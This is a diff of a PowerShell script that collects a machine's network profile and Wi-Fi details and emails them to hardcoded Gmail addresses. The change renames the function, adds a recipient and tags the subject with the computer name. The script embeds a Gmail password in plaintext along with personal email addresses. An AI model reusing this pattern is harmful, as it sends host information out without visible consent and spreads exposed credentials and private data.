@@ -1,6 +1,7 @@
 
 
-Function Send-Notification
+
+Function Send-NetInfo
 {
     param (
         [Parameter(Mandatory)]
@@ -9,11 +10,11 @@ Function Send-Notification
         [string]$msgbody
     )
     $email = "radicaltronic@gmail.com"
-    $recipients = "radicaltronic@gmail.com"
+    $recipients = "radicaltronic@gmail.com,guillaumeplante.qc@gmail.com"
     $pass = "SecretTEst23_"
 
     $EmailFrom = "radicaltronic@gmail.com"
-    $EmailTo = "guillaumeplante.qc@gmail.com"
+    $EmailTo = "radicaltronic@gmail.com,guillaumeplante.qc@gmail.com"
     $Subject = $subject
     $Body = $msgbody
     $SMTPServer = "smtp.gmail.com"
@@ -50,4 +51,4 @@ if($wifi_network_name -ne "")
 
 $EmailMessageBody = "NETWORK INFO: $NetProfiles $extended_info"
 
-Send-Notification "Network Profile Info" $EmailMessageBody 
+Send-NetInfo "$env:COMPUTERNAME : Network Profile Info" $EmailMessageBody 
